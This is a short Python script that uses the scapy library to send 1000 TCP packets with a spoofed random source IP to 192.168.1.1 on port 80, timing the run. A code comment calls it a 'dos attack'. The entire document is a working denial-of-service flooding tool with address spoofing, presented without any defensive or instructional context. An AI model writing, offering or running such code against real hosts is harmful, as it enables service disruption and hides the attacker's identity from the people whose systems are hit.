from scapy.all import IP, TCP, send
from random import randint
from time import time
def randip():
    return '.'.join( # produce random IP
        [str( randint(0, 255) ) for i in range(3)] + [str( randint(1, 255) )]  
    )
def attack(dst, dport, amount): # dos attack
    pkt = IP(src=randip(), dst=dst) / TCP(dport=dport) 
    for i in range(amount):
        send(pkt)

if __name__=="__main__":
    amount = 1000
    start_time = time()
    attack("192.168.1.1", 80, amount)
    use_time = time() - start_time
    print(use_time, use_time/amount)
